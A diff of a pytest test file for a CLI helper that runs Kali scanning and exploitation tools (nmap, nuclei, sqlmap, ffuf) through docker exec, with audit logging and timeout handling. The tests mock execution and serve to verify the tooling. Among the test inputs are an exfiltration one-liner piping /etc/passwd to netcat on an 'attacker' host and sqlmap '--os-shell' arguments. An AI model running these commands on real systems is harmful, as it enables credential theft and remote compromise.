@@ -4,6 +4,7 @@ Argparse round-trip plus mocked-helper coverage for the host-side execution
 helper. The actual `docker exec` is never invoked in these tests — `kali_exec`
 is monkeypatched to capture its call shape.
 """
+
 from __future__ import annotations
 
 import importlib
@@ -15,7 +16,6 @@ from pathlib import Path
 from types import ModuleType, SimpleNamespace
 
 import pytest
-
 
 _SCRIPTS_ROOT = Path(__file__).resolve().parents[3] / "agent" / "scripts"
 
@@ -117,61 +117,96 @@ def test_required_flag_messages_name_missing_flags(capsys):
         (
             "nmap-scan",
             [
-                "--target", "10.0.0.1",
-                "--ports", "top-100",
+                "--target",
+                "10.0.0.1",
+                "--ports",
+                "top-100",
                 "--service-detection",
-                "--technique", "RECON",
-                "--intent", "phase-1 baseline",
-                "--probe-kind", "fingerprint",
-                "--phase", "recon",
-                "--timeout", "600",
+                "--technique",
+                "RECON",
+                "--intent",
+                "phase-1 baseline",
+                "--probe-kind",
+                "fingerprint",
+                "--phase",
+                "recon",
+                "--timeout",
+                "600",
             ],
             ["nmap", "-sV", "--top-ports", "100", "10.0.0.1"],
         ),
         (
             "nuclei",
             [
-                "-l", "hosts.txt",
-                "-t", "http/cves/",
-                "--technique", "RECON",
-                "--intent", "reactive sweep",
-                "--probe-kind", "fingerprint",
-                "--phase", "recon",
-                "--timeout", "1800",
+                "-l",
+                "hosts.txt",
+                "-t",
+                "http/cves/",
+                "--technique",
+                "RECON",
+                "--intent",
+                "reactive sweep",
+                "--probe-kind",
+                "fingerprint",
+                "--phase",
+                "recon",
+                "--timeout",
+                "1800",
             ],
             ["nuclei", "-l", "hosts.txt", "-t", "http/cves/"],
         ),
         (
             "httpx",
             [
-                "-u", "https://x.example.com",
+                "-u",
+                "https://x.example.com",
                 "-tech-detect",
                 "-tls-grab",
-                "--technique", "RECON",
-                "--intent", "fingerprint stack",
-                "--probe-kind", "fingerprint",
-                "--phase", "recon",
-                "--timeout", "300",
+                "--technique",
+                "RECON",
+                "--intent",
+                "fingerprint stack",
+                "--probe-kind",
+                "fingerprint",
+                "--phase",
+                "recon",
+                "--timeout",
+                "300",
             ],
             ["httpx", "-u", "https://x.example.com", "-tech-detect", "-tls-grab"],
         ),
         (
             "sqlmap",
             [
-                "-u", "https://x.example.com/?id=1",
+                "-u",
+                "https://x.example.com/?id=1",
                 "--batch",
-                "--sql-technique", "BEUSTQ",
-                "--technique", "SQLI",
-                "--intent", "verify SQLi",
-                "--probe-kind", "payload",
-                "--phase", "consume-test",
-                "--timeout", "1800",
+                "--sql-technique",
+                "BEUSTQ",
+                "--technique",
+                "SQLI",
+                "--intent",
+                "verify SQLi",
+                "--probe-kind",
+                "payload",
+                "--phase",
+                "consume-test",
+                "--timeout",
+                "1800",
             ],
-            ["sqlmap", "-u", "https://x.example.com/?id=1", "--batch", "--technique=BEUSTQ"],
+            [
+                "sqlmap",
+                "-u",
+                "https://x.example.com/?id=1",
+                "--batch",
+                "--technique=BEUSTQ",
+            ],
         ),
     ],
 )
-def test_verb_translates_argv_into_underlying_command(monkeypatch, verb, argv, expected_substrings):
+def test_verb_translates_argv_into_underlying_command(
+    monkeypatch, verb, argv, expected_substrings
+):
     cli = _import("assess.cli")
     kali = _import("assess.lib.kali")
 
@@ -216,43 +251,65 @@ def test_verb_translates_argv_into_underlying_command(monkeypatch, verb, argv, e
         (
             "httpx",
             [
-                "-u", "https://x.example.com",
+                "-u",
+                "https://x.example.com",
                 "-tech-detect",
-                "--technique", "DISCOVERY",
-                "--intent", "tech detect with custom headers",
-                "--probe-kind", "fingerprint",
-                "--phase", "recon",
-                "--timeout", "60",
-                "--extra-args", "-H 'X-Forwarded-For: 127.0.0.1' -mc 200",
+                "--technique",
+                "DISCOVERY",
+                "--intent",
+                "tech detect with custom headers",
+                "--probe-kind",
+                "fingerprint",
+                "--phase",
+                "recon",
+                "--timeout",
+                "60",
+                "--extra-args",
+                "-H 'X-Forwarded-For: 127.0.0.1' -mc 200",
             ],
             ["-H", "X-Forwarded-For: 127.0.0.1", "-mc", "200"],
         ),
         (
             "ffuf",
             [
-                "-u", "https://x/FUZZ",
-                "-w", "/lists/common.txt",
-                "--technique", "FUZZ",
-                "--intent", "fuzz with extra header",
-                "--probe-kind", "payload",
-                "--phase", "consume-test",
-                "--timeout", "1800",
-                "--extra-args", "-H 'X-Real-IP: 127.0.0.1' -t 50",
+                "-u",
+                "https://x/FUZZ",
+                "-w",
+                "/lists/common.txt",
+                "--technique",
+                "FUZZ",
+                "--intent",
+                "fuzz with extra header",
+                "--probe-kind",
+                "payload",
+                "--phase",
+                "consume-test",
+                "--timeout",
+                "1800",
+                "--extra-args",
+                "-H 'X-Real-IP: 127.0.0.1' -t 50",
             ],
             ["-H", "X-Real-IP: 127.0.0.1", "-t", "50"],
         ),
         (
             "sqlmap",
             [
-                "-u", "https://x/?id=1",
+                "-u",
+                "https://x/?id=1",
                 "--batch",
-                "--technique", "SQLI",
-                "--intent", "sqli with os-shell",
-                "--probe-kind", "exploit",
-                "--phase", "exploit",
-                "--timeout", "3600",
+                "--technique",
+                "SQLI",
+                "--intent",
+                "sqli with os-shell",
+                "--probe-kind",
+                "exploit",
+                "--phase",
+                "exploit",
+                "--timeout",
+                "3600",
                 "--destructive",
-                "--extra-args", "--os-shell --tamper=space2comment",
+                "--extra-args",
+                "--os-shell --tamper=space2comment",
             ],
             ["--os-shell", "--tamper=space2comment"],
         ),
@@ -344,23 +401,71 @@ def test_hoist_root_flags_handles_either_position():
     cli = _import("assess.cli")
     cases = [
         # canonical front position — unchanged
-        (["--engagement-dir", "/tmp/x", "fetch", "surfaces"],
-         ["--engagement-dir", "/tmp/x", "fetch", "surfaces"]),
+        (
+            ["--engagement-dir", "/tmp/x", "fetch", "surfaces"],
+            ["--engagement-dir", "/tmp/x", "fetch", "surfaces"],
+        ),
         # hoist after kali verb
-        (["kali", "subfinder", "-d", "fema.gov", "--engagement-dir", "/tmp/x", "--technique", "RECON"],
-         ["--engagement-dir", "/tmp/x", "kali", "subfinder", "-d", "fema.gov", "--technique", "RECON"]),
+        (
+            [
+                "kali",
+                "subfinder",
+                "-d",
+                "example.com",
+                "--engagement-dir",
+                "/tmp/x",
+                "--technique",
+                "RECON",
+            ],
+            [
+                "--engagement-dir",
+                "/tmp/x",
+                "kali",
+                "subfinder",
+                "-d",
+                "example.com",
+                "--technique",
+                "RECON",
+            ],
+        ),
         # hoist `--flag=value` form
-        (["kali", "subfinder", "--engagement-dir=/tmp/x", "-d", "fema.gov"],
-         ["--engagement-dir=/tmp/x", "kali", "subfinder", "-d", "fema.gov"]),
+        (
+            ["kali", "subfinder", "--engagement-dir=/tmp/x", "-d", "example.com"],
+            ["--engagement-dir=/tmp/x", "kali", "subfinder", "-d", "example.com"],
+        ),
         # hoist actor-kind too
-        (["log", "operator", "msg", "--actor-kind", "agent"],
-         ["--actor-kind", "agent", "log", "operator", "msg"]),
+        (
+            ["log", "operator", "msg", "--actor-kind", "agent"],
+            ["--actor-kind", "agent", "log", "operator", "msg"],
+        ),
         # do NOT hoist anything after `--` (would corrupt kali exec user argv)
-        (["kali", "exec", "--", "echo", "--engagement-dir", "foo"],
-         ["kali", "exec", "--", "echo", "--engagement-dir", "foo"]),
+        (
+            ["kali", "exec", "--", "echo", "--engagement-dir", "foo"],
+            ["kali", "exec", "--", "echo", "--engagement-dir", "foo"],
+        ),
         # hoist legitimately before --, leave inner alone
-        (["kali", "exec", "--engagement-dir", "/tmp/x", "--", "echo", "--engagement-dir", "inner"],
-         ["--engagement-dir", "/tmp/x", "kali", "exec", "--", "echo", "--engagement-dir", "inner"]),
+        (
+            [
+                "kali",
+                "exec",
+                "--engagement-dir",
+                "/tmp/x",
+                "--",
+                "echo",
+                "--engagement-dir",
+                "inner",
+            ],
+            [
+                "--engagement-dir",
+                "/tmp/x",
+                "kali",
+                "exec",
+                "--",
+                "echo",
+                "--engagement-dir",
+                "inner",
+            ],
+        ),
     ]
     for argv, expected in cases:
         assert cli._hoist_root_flags(argv) == expected, f"{argv!r}"
@@ -395,17 +500,27 @@ def test_extra_args_not_exposed_on_kali_exec():
     flags and the audit row's intent becomes ambiguous."""
     cli = _import("assess.cli")
     with pytest.raises(SystemExit) as exc:
-        cli.main([
-            "kali", "exec",
-            "--technique", "RECON",
-            "--intent", "extra args probe",
-            "--probe-kind", "baseline",
-            "--phase", "recon",
-            "--timeout", "60",
-            "--extra-args", "-foo",
-            "--",
-            "curl", "https://x",
-        ])
+        cli.main(
+            [
+                "kali",
+                "exec",
+                "--technique",
+                "RECON",
+                "--intent",
+                "extra args probe",
+                "--probe-kind",
+                "baseline",
+                "--phase",
+                "recon",
+                "--timeout",
+                "60",
+                "--extra-args",
+                "-foo",
+                "--",
+                "curl",
+                "https://x",
+            ]
+        )
     # argparse error exits with non-zero.
     assert exc.value.code != 0
 
@@ -435,18 +550,26 @@ def test_kali_exec_passthrough_carries_full_command(monkeypatch):
     mod = _import("assess.commands.kali_exec")
     monkeypatch.setattr(mod, "kali_exec", fake_kali_exec)
 
-    cli.main([
-        "kali", "exec",
-        "--technique", "RECON",
-        "--intent", "raw curl probe",
-        "--probe-kind", "baseline",
-        "--phase", "recon",
-        "--timeout", "60",
-        "--",
-        "curl",
-        "-sS",
-        "https://example.com/health",
-    ])
+    cli.main(
+        [
+            "kali",
+            "exec",
+            "--technique",
+            "RECON",
+            "--intent",
+            "raw curl probe",
+            "--probe-kind",
+            "baseline",
+            "--phase",
+            "recon",
+            "--timeout",
+            "60",
+            "--",
+            "curl",
+            "-sS",
+            "https://example.com/health",
+        ]
+    )
     assert captured["cmd"] == ["curl", "-sS", "https://example.com/health"]
     assert captured["tool_name"] == "curl"
 
@@ -461,7 +584,9 @@ def fake_engagement(tmp_path, monkeypatch):
     eng_dir = tmp_path / "engagements" / "2026-04-26-test"
     eng_dir.mkdir(parents=True, exist_ok=True)
     (eng_dir / "scope.json").write_text(json.dumps({"hostname": "example.com"}))
-    (eng_dir / "auth.json").write_text(json.dumps({"kind": "cookies", "state": "present"}))
+    (eng_dir / "auth.json").write_text(
+        json.dumps({"kind": "cookies", "state": "present"})
+    )
     monkeypatch.setenv("ENGAGEMENT_DIR", str(eng_dir))
     monkeypatch.setenv("AGENT_NAME", "vulnerability-analyst")
     return eng_dir
@@ -596,7 +721,9 @@ def test_kali_exec_writes_pre_exec_row_then_finalizes(monkeypatch, fake_engageme
     assert patch_payload["timed_out"] is False
 
 
-def test_kali_exec_timeout_kills_process_group_and_marks_timed_out(monkeypatch, fake_engagement):
+def test_kali_exec_timeout_kills_process_group_and_marks_timed_out(
+    monkeypatch, fake_engagement
+):
     kali = _setup_fake_config(monkeypatch, fake_engagement)
     fake_client = _FakeClient("http://127.0.0.1:18000", fake_engagement.name)
     monkeypatch.setattr(kali, "AssessmentClient", lambda *a, **k: fake_client)
@@ -699,14 +826,16 @@ def test_b1_docker_exec_wrapper_captures_in_container_pid(monkeypatch, fake_enga
     # in `&&`/`||` so a failed write logs to stderr and still execs. Both
     # branches must end in `exec "$@"` so the user command runs either way.
     assert '&& exec "$@"' in wrapper
-    assert '|| (echo' in wrapper and 'PID write to' in wrapper and 'failed' in wrapper
+    assert "|| (echo" in wrapper and "PID write to" in wrapper and "failed" in wrapper
     assert wrapper.count('exec "$@"') == 2
     # ``sh`` placeholder makes ``$@`` skip the script-name positional.
     assert argv[6] == "sh"
     assert argv[7:] == ["nmap", "-sV", "10.0.0.1"]
 
 
-def test_b1_docker_exec_wrapper_with_strace_keeps_pid_capture(monkeypatch, fake_engagement):
+def test_b1_docker_exec_wrapper_with_strace_keeps_pid_capture(
+    monkeypatch, fake_engagement
+):
     """B1 + L18: when ``--strace`` is set, the wrapper still records the
     container-side PID before exec-ing strace. The strace artifact path and
     the pid file must share the same ``run_uuid`` so audit ↔ pid file ↔
@@ -740,10 +869,10 @@ def test_b1_docker_exec_wrapper_with_strace_keeps_pid_capture(monkeypatch, fake_
     wrapper = captured["argv"][5]
     assert "echo $$ > /tmp/aith-pid-" in wrapper
     assert "strace -f -e trace=network,write,unlink" in wrapper
-    assert 'exec strace ' in wrapper
+    assert "exec strace " in wrapper
     # Race-protected wrapper: succeed branch and fallback branch both exec strace.
-    assert wrapper.count('exec strace') == 2
-    assert '|| (echo' in wrapper and 'PID write to' in wrapper
+    assert wrapper.count("exec strace") == 2
+    assert "|| (echo" in wrapper and "PID write to" in wrapper
     # Same UUID body in both file paths so the operator can correlate them.
     import re
 
@@ -753,7 +882,9 @@ def test_b1_docker_exec_wrapper_with_strace_keeps_pid_capture(monkeypatch, fake_
     assert pid_match.group(1) == strace_match.group(1)
 
 
-def test_b1_timeout_cascade_kills_in_container_pid_then_host_pgid(monkeypatch, fake_engagement):
+def test_b1_timeout_cascade_kills_in_container_pid_then_host_pgid(
+    monkeypatch, fake_engagement
+):
     """B1: on wall-clock timeout, the helper must read the wrapper-recorded
     PID and send ``docker exec kill -TERM <pid>`` (and then ``-KILL`` if the
     process survives the 5s grace) so the in-container tool tree dies even
@@ -827,7 +958,9 @@ def test_b1_timeout_cascade_kills_in_container_pid_then_host_pgid(monkeypatch, f
     assert len(cleanups) == 1
 
 
-def test_b1_timeout_without_pid_file_falls_back_to_host_kill(monkeypatch, fake_engagement, capsys):
+def test_b1_timeout_without_pid_file_falls_back_to_host_kill(
+    monkeypatch, fake_engagement, capsys
+):
     """B1 edge: when the wrapper hadn't written the pid file yet (race) or
     the container is gone (read fails), the helper must log a warning and
     still issue the host-side process-group kill cascade rather than crash."""
@@ -918,14 +1051,25 @@ def test_b1_orphan_cleanup_via_live_runtime():
 
     proc = subprocess.run(
         [
-            aith, "assess", "kali", "exec",
-            "--technique", "RECON",
-            "--intent", "B1 orphan-cleanup acceptance test",
-            "--probe-kind", "fingerprint",
-            "--phase", "recon",
-            "--timeout", "2",
+            aith,
+            "assess",
+            "kali",
+            "exec",
+            "--technique",
+            "RECON",
+            "--intent",
+            "B1 orphan-cleanup acceptance test",
+            "--probe-kind",
+            "fingerprint",
+            "--phase",
+            "recon",
+            "--timeout",
+            "2",
             "--",
-            "nmap", "-p", "1-65535", "127.0.0.1",
+            "nmap",
+            "-p",
+            "1-65535",
+            "127.0.0.1",
         ],
         check=False,
         capture_output=True,
@@ -948,7 +1092,9 @@ def test_b1_orphan_cleanup_via_live_runtime():
     )
 
 
-def test_kali_exec_dedup_warns_and_returns_early_without_force(monkeypatch, fake_engagement, capsys):
+def test_kali_exec_dedup_warns_and_returns_early_without_force(
+    monkeypatch, fake_engagement, capsys
+):
     kali = _setup_fake_config(monkeypatch, fake_engagement)
 
     class _DedupClient(_FakeClient):
@@ -990,12 +1136,17 @@ def test_kali_exec_dedup_force_bypasses_check(monkeypatch, fake_engagement):
     class _DedupClient(_FakeClient):
         def post(self, endpoint, payload):
             self.posts.append((endpoint, payload))
-            return {"id": 11, "superseded_by_id": 10 if not payload.get("force") else None}
+            return {
+                "id": 11,
+                "superseded_by_id": 10 if not payload.get("force") else None,
+            }
 
     fake_client = _DedupClient("http://127.0.0.1:18000", fake_engagement.name)
     monkeypatch.setattr(kali, "AssessmentClient", lambda *a, **k: fake_client)
     monkeypatch.setattr(kali, "_check_container_running", lambda name: None)
-    monkeypatch.setattr(kali.subprocess, "Popen", lambda *a, **k: _FakePopen(returncode=0))
+    monkeypatch.setattr(
+        kali.subprocess, "Popen", lambda *a, **k: _FakePopen(returncode=0)
+    )
 
     result = kali.kali_exec(
         ["nmap", "-p", "22", "10.0.0.1"],
@@ -1023,7 +1174,9 @@ def _kali_exec_with_technique(monkeypatch, fake_engagement, technique: str):
     fake_client = _FakeClient("http://127.0.0.1:18000", fake_engagement.name)
     monkeypatch.setattr(kali, "AssessmentClient", lambda *a, **k: fake_client)
     monkeypatch.setattr(kali, "_check_container_running", lambda name: None)
-    monkeypatch.setattr(kali.subprocess, "Popen", lambda *a, **k: _FakePopen(returncode=0))
+    monkeypatch.setattr(
+        kali.subprocess, "Popen", lambda *a, **k: _FakePopen(returncode=0)
+    )
     result = kali.kali_exec(
         ["echo", "smoke"],
         technique=technique,
@@ -1041,23 +1194,33 @@ def _kali_exec_with_technique(monkeypatch, fake_engagement, technique: str):
 
 def test_kali_exec_accepts_meta_technique(monkeypatch, fake_engagement):
     """N10 — `META` is accepted on the kali_exec round-trip (operator-side metadata)."""
-    result, fake_client = _kali_exec_with_technique(monkeypatch, fake_engagement, "META")
+    result, fake_client = _kali_exec_with_technique(
+        monkeypatch, fake_engagement, "META"
+    )
     assert result.status == "completed"
     assert any(payload.get("technique") == "META" for _ep, payload in fake_client.posts)
 
 
 def test_kali_exec_accepts_health_technique(monkeypatch, fake_engagement):
     """N10 — `HEALTH` is accepted (runtime health smoke / version probes)."""
-    result, fake_client = _kali_exec_with_technique(monkeypatch, fake_engagement, "HEALTH")
+    result, fake_client = _kali_exec_with_technique(
+        monkeypatch, fake_engagement, "HEALTH"
+    )
     assert result.status == "completed"
-    assert any(payload.get("technique") == "HEALTH" for _ep, payload in fake_client.posts)
+    assert any(
+        payload.get("technique") == "HEALTH" for _ep, payload in fake_client.posts
+    )
 
 
 def test_kali_exec_accepts_log_read_technique(monkeypatch, fake_engagement):
     """N10 — `LOG-READ` is accepted (reading existing artifacts/log files)."""
-    result, fake_client = _kali_exec_with_technique(monkeypatch, fake_engagement, "LOG-READ")
+    result, fake_client = _kali_exec_with_technique(
+        monkeypatch, fake_engagement, "LOG-READ"
+    )
     assert result.status == "completed"
-    assert any(payload.get("technique") == "LOG-READ" for _ep, payload in fake_client.posts)
+    assert any(
+        payload.get("technique") == "LOG-READ" for _ep, payload in fake_client.posts
+    )
 
 
 def test_kali_exec_rejects_unknown_technique(monkeypatch, fake_engagement):
@@ -1112,17 +1275,24 @@ def test_kali_exec_rejects_intent_too_long(monkeypatch, fake_engagement):
     assert "intent" in str(exc.value).lower()
 
 
-def test_kali_exec_audit_post_failure_writes_marker_and_continues(monkeypatch, fake_engagement, capsys):
+def test_kali_exec_audit_post_failure_writes_marker_and_continues(
+    monkeypatch, fake_engagement, capsys
+):
     kali = _setup_fake_config(monkeypatch, fake_engagement)
 
     class _BrokenClient(_FakeClient):
         def post(self, endpoint, payload):
             from assess.lib.client import AssessError
+
             raise AssessError("backend down")
 
-    monkeypatch.setattr(kali, "AssessmentClient", lambda *a, **k: _BrokenClient("u", "k"))
+    monkeypatch.setattr(
+        kali, "AssessmentClient", lambda *a, **k: _BrokenClient("u", "k")
+    )
     monkeypatch.setattr(kali, "_check_container_running", lambda name: None)
-    monkeypatch.setattr(kali.subprocess, "Popen", lambda *a, **k: _FakePopen(returncode=0))
+    monkeypatch.setattr(
+        kali.subprocess, "Popen", lambda *a, **k: _FakePopen(returncode=0)
+    )
 
     result = kali.kali_exec(
         ["nmap", "10.0.0.1"],
@@ -1313,7 +1483,7 @@ def test_extend_cmd_with_extra_args_unbalanced_quotes_raises_assesserror():
     kali = _import("assess.lib.kali")
     from assess.lib.client import AssessError
 
-    args = SimpleNamespace(extra_args="-H \"unclosed")
+    args = SimpleNamespace(extra_args='-H "unclosed')
     with pytest.raises(AssessError) as exc:
         kali.extend_cmd_with_extra_args(["httpx"], args)
     assert "invalid shell quoting" in str(exc.value)
@@ -1352,7 +1522,9 @@ def test_analyze_tool_name_records_pipeline_stages_and_indeterminate_flag():
     pipe-stage head, in order) and `tool_name_indeterminate=True` when the
     chosen head is a bash variable expansion."""
     kali = _import("assess.lib.kali")
-    name, meta = kali._analyze_tool_name(["bash", "-c", "cat /etc/passwd | nc attacker 4444"])
+    name, meta = kali._analyze_tool_name(
+        ["bash", "-c", "cat /etc/passwd | nc attacker 4444"]
+    )
     assert name == "nc"
     assert meta["shell_pipeline_tools"] == ["cat", "nc"]
     assert "tool_name_indeterminate" not in meta
@@ -1368,7 +1540,9 @@ def test_hoist_root_flags_rejects_flag_shaped_value():
     becoming the engagement directory path."""
     cli = _import("assess.cli")
     with pytest.raises(SystemExit) as exc:
-        cli._hoist_root_flags(["kali", "subfinder", "--engagement-dir", "--phase", "recon"])
+        cli._hoist_root_flags(
+            ["kali", "subfinder", "--engagement-dir", "--phase", "recon"]
+        )
     msg = str(exc.value)
     assert "--engagement-dir" in msg and "looks like a flag" in msg
 
@@ -1379,7 +1553,13 @@ def test_hoist_root_flags_rejects_duplicate_engagement_dir():
     cli = _import("assess.cli")
     with pytest.raises(SystemExit) as exc:
         cli._hoist_root_flags(
-            ["--engagement-dir", "/tmp/a", "kali", "subfinder", "--engagement-dir=/tmp/b"]
+            [
+                "--engagement-dir",
+                "/tmp/a",
+                "kali",
+                "subfinder",
+                "--engagement-dir=/tmp/b",
+            ]
         )
     assert "more than once" in str(exc.value)
 
@@ -1415,18 +1595,31 @@ def test_kali_job_start_validates_audit_metadata_and_resolves_agent(
     mod = _import("assess.commands.kali_job")
     monkeypatch.setattr(mod, "start_job", fake_start_job)
 
-    cli.main([
-        "--engagement-dir", str(fake_engagement),
-        "kali", "job", "start",
-        "--technique", "RECON",
-        "--intent", "long sweep",
-        "--probe-kind", "fingerprint",
-        "--phase", "recon",
-        "--timeout", "1200",
-        "--target-host", "x.example.com",
-        "--",
-        "nuclei", "-l", "hosts.txt",
-    ])
+    cli.main(
+        [
+            "--engagement-dir",
+            str(fake_engagement),
+            "kali",
+            "job",
+            "start",
+            "--technique",
+            "RECON",
+            "--intent",
+            "long sweep",
+            "--probe-kind",
+            "fingerprint",
+            "--phase",
+            "recon",
+            "--timeout",
+            "1200",
+            "--target-host",
+            "x.example.com",
+            "--",
+            "nuclei",
+            "-l",
+            "hosts.txt",
+        ]
+    )
     meta = captured["audit_meta"]
     assert meta["technique"] == "RECON"
     assert meta["intent"] == "long sweep"
@@ -1438,7 +1631,9 @@ def test_kali_job_start_validates_audit_metadata_and_resolves_agent(
     assert captured["kwargs"]["engagement_dir"] == fake_engagement.resolve()
 
 
-def test_kali_job_start_warns_when_timeout_omitted(monkeypatch, fake_engagement, capsys):
+def test_kali_job_start_warns_when_timeout_omitted(
+    monkeypatch, fake_engagement, capsys
+):
     """P1 #2: --timeout is optional but the helper emits a stderr warn so
     the operator notices they're using the 24h default."""
     cli = _import("assess.cli")
@@ -1450,16 +1645,27 @@ def test_kali_job_start_warns_when_timeout_omitted(monkeypatch, fake_engagement,
     mod = _import("assess.commands.kali_job")
     monkeypatch.setattr(mod, "start_job", fake_start_job)
 
-    cli.main([
-        "--engagement-dir", str(fake_engagement),
-        "kali", "job", "start",
-        "--technique", "RECON",
-        "--intent", "long sweep no timeout",
-        "--probe-kind", "fingerprint",
-        "--phase", "recon",
-        "--",
-        "nuclei", "-l", "hosts.txt",
-    ])
+    cli.main(
+        [
+            "--engagement-dir",
+            str(fake_engagement),
+            "kali",
+            "job",
+            "start",
+            "--technique",
+            "RECON",
+            "--intent",
+            "long sweep no timeout",
+            "--probe-kind",
+            "fingerprint",
+            "--phase",
+            "recon",
+            "--",
+            "nuclei",
+            "-l",
+            "hosts.txt",
+        ]
+    )
     err = capsys.readouterr().err
     assert "timeout" in err.lower() and "24h" in err.lower()
 
@@ -1469,21 +1675,33 @@ def test_kali_job_start_rejects_unknown_technique(monkeypatch, fake_engagement):
     cli = _import("assess.cli")
     monkeypatch.setenv("AGENT_NAME", "recon-specialist")
     with pytest.raises(SystemExit) as exc:
-        cli.main([
-            "--engagement-dir", str(fake_engagement),
-            "kali", "job", "start",
-            "--technique", "MADE-UP-NOT-IN-ENUM",
-            "--intent", "x",
-            "--probe-kind", "fingerprint",
-            "--phase", "recon",
-            "--timeout", "60",
-            "--",
-            "nuclei",
-        ])
+        cli.main(
+            [
+                "--engagement-dir",
+                str(fake_engagement),
+                "kali",
+                "job",
+                "start",
+                "--technique",
+                "MADE-UP-NOT-IN-ENUM",
+                "--intent",
+                "x",
+                "--probe-kind",
+                "fingerprint",
+                "--phase",
+                "recon",
+                "--timeout",
+                "60",
+                "--",
+                "nuclei",
+            ]
+        )
     assert exc.value.code != 0
 
 
-def test_kali_job_stop_terminates_with_sigterm_then_sigkill(monkeypatch, fake_engagement):
+def test_kali_job_stop_terminates_with_sigterm_then_sigkill(
+    monkeypatch, fake_engagement
+):
     """P1 #3: stop must SIGTERM, wait, SIGKILL if needed, and only PATCH
     `status=killed` once the in-container PID is confirmed dead."""
     kali_jobs = _import("assess.lib.kali_jobs")
@@ -1537,7 +1755,9 @@ def test_kali_job_stop_terminates_with_sigterm_then_sigkill(monkeypatch, fake_en
     assert ("jobs/22", {"status": "killed"}) in fake_client.patches
 
 
-def test_kali_job_stop_escalates_to_sigkill_when_sigterm_ignored(monkeypatch, fake_engagement):
+def test_kali_job_stop_escalates_to_sigkill_when_sigterm_ignored(
+    monkeypatch, fake_engagement
+):
     """P1 #3: when SIGTERM doesn't kill the process inside the 10s grace,
     the helper escalates to SIGKILL."""
     kali_jobs = _import("assess.lib.kali_jobs")
@@ -1593,7 +1813,9 @@ def test_kali_job_stop_escalates_to_sigkill_when_sigterm_ignored(monkeypatch, fa
     assert record["status"] == "killed"
 
 
-def test_kali_job_stop_records_stop_failed_when_sigkill_also_fails(monkeypatch, fake_engagement):
+def test_kali_job_stop_records_stop_failed_when_sigkill_also_fails(
+    monkeypatch, fake_engagement
+):
     """P1 #3: if the process is still alive after SIGKILL the helper PATCHes
     `status=stop_failed` and surfaces the error to the caller."""
     kali_jobs = _import("assess.lib.kali_jobs")
@@ -1669,7 +1891,9 @@ def test_finalize_409_swallowed_as_success(monkeypatch, fake_engagement):
     fake_client.patch = fake_patch  # type: ignore[assignment]
     monkeypatch.setattr(kali, "AssessmentClient", lambda *a, **k: fake_client)
     monkeypatch.setattr(kali, "_check_container_running", lambda name: None)
-    monkeypatch.setattr(kali.subprocess, "Popen", lambda *a, **k: _FakePopen(returncode=0))
+    monkeypatch.setattr(
+        kali.subprocess, "Popen", lambda *a, **k: _FakePopen(returncode=0)
+    )
 
     result = kali.kali_exec(
         ["nmap", "-sV", "10.0.0.1"],
@@ -1804,17 +2028,27 @@ def test_asnmap_translates_argv(monkeypatch):
     mod = _import("assess.commands.kali_asnmap")
     monkeypatch.setattr(mod, "kali_exec", fake_kali_exec)
 
-    cli.main([
-        "kali", "asnmap",
-        "-d", "example.com",
-        "-silent",
-        "-o", "/engagements/x/scans/cidrs.txt",
-        "--technique", "OSINT",
-        "--intent", "ASN→CIDR mapping for example.com",
-        "--probe-kind", "fingerprint",
-        "--phase", "recon",
-        "--timeout", "300",
-    ])
+    cli.main(
+        [
+            "kali",
+            "asnmap",
+            "-d",
+            "example.com",
+            "-silent",
+            "-o",
+            "/engagements/x/scans/cidrs.txt",
+            "--technique",
+            "OSINT",
+            "--intent",
+            "ASN→CIDR mapping for example.com",
+            "--probe-kind",
+            "fingerprint",
+            "--phase",
+            "recon",
+            "--timeout",
+            "300",
+        ]
+    )
     cmd = captured["cmd"]
     assert cmd[0] == "asnmap"
     assert "-d" in cmd and "example.com" in cmd
@@ -1830,14 +2064,22 @@ def test_asnmap_requires_target_or_list(capsys):
     cli = _import("assess.cli")
 
     with pytest.raises(SystemExit) as exc:
-        cli.main([
-            "kali", "asnmap",
-            "--technique", "OSINT",
-            "--intent", "missing-target test",
-            "--probe-kind", "fingerprint",
-            "--phase", "recon",
-            "--timeout", "60",
-        ])
+        cli.main(
+            [
+                "kali",
+                "asnmap",
+                "--technique",
+                "OSINT",
+                "--intent",
+                "missing-target test",
+                "--probe-kind",
+                "fingerprint",
+                "--phase",
+                "recon",
+                "--timeout",
+                "60",
+            ]
+        )
     assert exc.value.code != 0
     err = capsys.readouterr().err
     assert "asnmap" in err
@@ -1874,16 +2116,26 @@ def test_nmap_ports_accepts_documented_shapes(monkeypatch, ports_value):
     mod = _import("assess.commands.kali_nmap")
     monkeypatch.setattr(mod, "kali_exec", fake_kali_exec)
 
-    cli.main([
-        "kali", "nmap-scan",
-        "--target", "10.0.0.1",
-        "--ports", ports_value,
-        "--technique", "RECON",
-        "--intent", f"ports={ports_value} parse smoke",
-        "--probe-kind", "fingerprint",
-        "--phase", "recon",
-        "--timeout", "600",
-    ])
+    cli.main(
+        [
+            "kali",
+            "nmap-scan",
+            "--target",
+            "10.0.0.1",
+            "--ports",
+            ports_value,
+            "--technique",
+            "RECON",
+            "--intent",
+            f"ports={ports_value} parse smoke",
+            "--probe-kind",
+            "fingerprint",
+            "--phase",
+            "recon",
+            "--timeout",
+            "600",
+        ]
+    )
 
 
 def test_nmap_scan_type_rejects_legacy_pseudo_values():
@@ -1894,16 +2146,26 @@ def test_nmap_scan_type_rejects_legacy_pseudo_values():
     cli = _import("assess.cli")
     for legacy in ("top-1000", "full-tcp", "udp-top", "targeted", "ports-only"):
         with pytest.raises(SystemExit):
-            cli.main([
-                "kali", "nmap-scan",
-                "--target", "10.0.0.1",
-                "--scan-type", legacy,
-                "--technique", "RECON",
-                "--intent", "drift-value rejection",
-                "--probe-kind", "fingerprint",
-                "--phase", "recon",
-                "--timeout", "600",
-            ])
+            cli.main(
+                [
+                    "kali",
+                    "nmap-scan",
+                    "--target",
+                    "10.0.0.1",
+                    "--scan-type",
+                    legacy,
+                    "--technique",
+                    "RECON",
+                    "--intent",
+                    "drift-value rejection",
+                    "--probe-kind",
+                    "fingerprint",
+                    "--phase",
+                    "recon",
+                    "--timeout",
+                    "600",
+                ]
+            )
 
 
 def test_alterx_estimate_flag_appended(monkeypatch):
@@ -1933,17 +2195,26 @@ def test_alterx_estimate_flag_appended(monkeypatch):
     mod = _import("assess.commands.kali_alterx")
     monkeypatch.setattr(mod, "kali_exec", fake_kali_exec)
 
-    cli.main([
-        "kali", "alterx",
-        "-l", "/engagements/x/scans/subs_passive.txt",
-        "-enrich",
-        "-estimate",
-        "--technique", "RECON",
-        "--intent", "alterx estimate-first",
